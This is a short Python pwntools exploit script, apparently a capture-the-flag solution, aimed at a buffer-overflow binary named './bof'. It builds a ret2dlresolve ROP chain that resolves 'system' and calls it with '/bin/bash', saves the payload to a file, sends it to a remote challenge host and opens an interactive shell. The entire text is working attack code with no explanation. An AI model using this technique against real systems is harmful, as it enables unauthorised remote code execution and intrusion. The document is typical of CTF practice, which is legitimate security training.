from pwn import *

program = "./bof"
context.binary = program
elf = ELF(program)
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/bash"])

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = remote('challenges.ctfd.io', 30096)
x = fit({0x80+context.bytes: raw_rop, 0x150: dlresolve.payload})
print(x)
with open("payload", "wb") as f:
	f.write(x)
p.sendline(x)

p.interactive()